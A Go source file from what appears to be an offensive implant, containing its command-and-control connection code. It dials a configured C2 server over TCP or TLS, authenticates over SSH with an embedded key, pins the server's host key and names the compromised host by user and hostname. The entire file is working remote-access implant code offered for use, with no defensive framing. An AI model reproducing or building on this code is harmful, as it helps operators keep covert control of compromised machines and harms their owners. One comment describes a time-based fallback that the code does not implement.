package main

/*
 * implant2server.go
 * Comms between the implant and server.
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220331
 */

import (
	"crypto/subtle"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/user"
	"strconv"
	"strings"

	"golang.org/x/crypto/ssh"
)

// ConnectToC2 makes an SSH connection to the C2 server.
func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error) {
	/* Roll a config to auth to the server. */
	conf := &ssh.ClientConfig{
		User: getUsername(),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(Signer),
		},
		HostKeyCallback: checkHostKey,
		ClientVersion:   SSHVersion,
	}

	/* Connect to the server. */
	var (
		c    net.Conn
		addr string
		err  error
	)
	switch strings.ToLower(ServerProto) {
	case "ssh":
		c, err = net.Dial("tcp", ServerAddr)
		if nil != err {
			break
		}
		addr = c.RemoteAddr().String()
		Debugf(
			"Made TCP connection to server %s->%s",
			c.LocalAddr(),
			c.RemoteAddr(),
		)
	case "tls":
		/* Work out the hostname. */
		h, _, err := net.SplitHostPort(ServerAddr)
		if nil != err {
			return nil, nil, nil, fmt.Errorf(
				"Error extracting hostname from %q: %s",
				ServerAddr,
				err,
			)
		}
		c, err = tls.Dial("tcp", ServerAddr, &tls.Config{
			ServerName: h,
		})
		if nil != err {
			break
		}
		addr = c.RemoteAddr().String()
		Debugf(
			"Made TLS connection to server %s->%s",
			c.LocalAddr(),
			c.RemoteAddr(),
		)
	default:
		return nil, nil, nil, fmt.Errorf(
			"unimplemented protocol %q",
			ServerProto,
		)
	}
	if nil != err {
		return nil, nil, nil, fmt.Errorf(
			"connecting to server: %w",
			err,
		)
	}

	/* SSHify */
	cc, chans, reqs, err := ssh.NewClientConn(c, addr, conf)
	if nil != err {
		return nil, nil, nil, fmt.Errorf(
			"ssh handshake failed: %w",
			err,
		)
	}
	Debugf("SSH handshake with server succeeded")

	return cc, chans, reqs, nil
}

/* getUsername tries to get a username for the connection.  It first tries
the hostname, then the current user, then finally the time. */
func getUsername() string {
	/* Get the username, or failing that the userid. */
	u, err := user.Current()
	var un string
	if nil != err {
		Debugf("Unable to get user info: %s", err)
		un = strconv.Itoa(os.Getuid())
	} else {
		un = u.Username
	}

	/* Append the hostname, if we have it. */
	n, err := os.Hostname()
	if nil != err {
		Debugf("Unable to get hostname: %s", err)
	} else {
		return fmt.Sprintf("%s@%s", un, n)
	}

	return un
}

/* checkHostKey checks the server's hostkey against the global ServerFP. */
func checkHostKey(hostname string, remote net.Addr, key ssh.PublicKey) error {
	if 1 != subtle.ConstantTimeCompare(
		[]byte(ServerFP),
		[]byte(ssh.FingerprintSHA256(key)),
	) {
		return fmt.Errorf("host key fingerprint doesn't match")
	}

	return nil
}
